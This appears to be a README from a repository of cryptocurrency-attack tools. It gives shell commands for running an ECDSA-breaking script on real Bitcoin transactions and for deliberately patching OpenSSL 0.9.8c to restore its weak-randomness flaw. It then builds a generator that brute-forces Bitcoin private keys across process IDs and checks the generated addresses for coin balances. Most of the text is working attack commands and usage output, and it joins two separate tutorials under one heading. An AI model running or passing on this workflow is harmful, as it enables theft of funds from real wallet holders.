# Reducing the private key through scalar multiplication

---

* Tutorial: https://youtu.be/zu2yiaZ_LOs
* Tutorial: https://cryptodeep.ru/reduce-private-key

---

# Commands:

    git clone https://github.com/demining/CryptoDeepTools.git

    cd CryptoDeepTools/08ReducePrivateKey/

    ls

    pip3 install ECPy

    python3 maxwell.py

    pip2 install -r requirements.txt

    python2 breakECDSA.py 01000000017fbdd4c9991d0ba4fb0a0c06f6933442c17678bce6dfa4bf80e22ed530bb933c010000008a47304402206d0ab626a7e477c27602ed63b2651517af077e6f3fafda671dd9952dfcb5f0b90220168eb51a48ce7496a699a800299f15638e0a7f36ae84e84e26df0cd2a280a70e014104b3fdc0e84cd77cd018ced1fdd3ea4110d6beb942cfd38c0f6feaffc246e08b97fe779e87e4743f55168a476433100abd4cac064be5915cf828185319480b3fb4feffffff0240597307000000001976a914211090b628fa6351fa8240232e3c2753fd5eece588ac700369d2050000001976a914ce639943ce1602e30b249faf74388ee0eeb1d3c588ac84b90700 >> PublicKeys.txt
python2 breakECDSA.py 01000000014666d430766d611cc7f2c21494e68e463ac4be8bb2f70b91693728324849e1c3010000008a473044022057a02a4abc38e2e3e1809b05402cf52faef7e101d6364d43bb0305f8796b0fb202203d1934a016c91072ffe137575734454161284ab3371a0cfc6767db7f27f24a75014104ea7c9e85d4fb089e0b2901cd5c77f3149aa4cf711ed29a3318a4e153a67ea9cd1a22c24c8e05b66eb122db74d26fddf2cb184033fb586743ea330e15eeb8240cffffffff01b0feea0b000000001976a9148300ab0caebb6e85cf9e6b287a57924d1ac7c82f88ac00000000 >> PublicKeys.txt
python2 breakECDSA.py 01000000019d8e5e1bfac780b813e41517926aca95048e1dea92cbbe2a98475ff53ad38ccd000000008c493046022100c7b76326879a5ec7df2ffedb292a45c13c6f154982fc2cd7e05f0d0d0dce2d05022100d7fd43416608eaeb6356f04b601ac6edd23e0f82de44689fe5a7aa2f576637a001410480edda62d055008c28de19f4908cd052ccf63a10d708b5866b7a5b340bde49e2b5e7be50412afb83a6c774ed5b45fdf9ad5cbbd98b7f1964f1cb180b7bc6d56cffffffff01a93de702000000001976a914119fb35bad07974c1a8d47d210ca3048bb13be8788ac00000000 >> PublicKeys.txt

    mv openssl-0.9.8c openssl-0.9.8c-vuln

    cd openssl-0.9.8c-vuln

    ls -lh

    patch -p1 <../make-OpenSSL-0-9-8c-vulnerable-again.diff

    ./Configure linux-x86_64 shared no-ssl2 no-ssl3 no-comp no-asm

    make depend all

    cd /

    ls

    cd content/CryptoDeepTools/05VulnerableOpenSSL/

    ls -lh


# Compilation:

    gcc -o cryptodeepbtcgen cryptodeepbtc.c -I./openssl-0.9.8c-vuln/include -L./openssl-0.9.8c-vuln -lssl -lcrypto

    ls -lh


RUN:

    LD_LIBRARY_PATH=./openssl-0.9.8c-vuln/ ./cryptodeepbtcgen -h


Version 0.1.2 (le64)

Usage:

-p n-m		Brute Force between PID n-m [default 0-32768]

-n <num>	Create num number of keys per PID [default: 10]

-l		Show all supported BTC versions

-v <prog>	Which BTC version to run (Try -l to find number) [0-43]

-x		Skip Self-Check



    LD_LIBRARY_PATH=./openssl-0.9.8c-vuln/ ./cryptodeepbtcgen -l



#0   - 0.3.24

#1   - 0.8.6-d

#2   - 0.8.6-qt

#3   - 0.9.1-d

#4   - 0.9.4-d

#5   - unknownA

#6   - unknownB

#7   - unknownC

e.t.c
e.t.c


    LD_LIBRARY_PATH=./openssl-0.9.8c-vuln/ ./cryptodeepbtcgen -n 32 -v 0 >> result.txt


Next, it remains to check all the generated Bitcoin Addresses for the presence of BTC coins, for this we can use a python script:  [bitcoin-checker.py](https://github.com/demining/CryptoDeepTools/blob/main/03CheckBitcoinAddressBalance/bitcoin-checker.py)


---

* Tutorial: https://youtu.be/zHkXups2I8k
* Tutorial: https://cryptodeep.ru/vulnerable-openssl

---







|  | Donation Address |
| --- | --- |
| ♥ __BTC__ | 1Lw2kh9WzCActXSGHxyypGLkqQZfxDpw8v |
| ♥ __ETH__ | 0xaBd66CF90898517573f19184b3297d651f7b90bf |
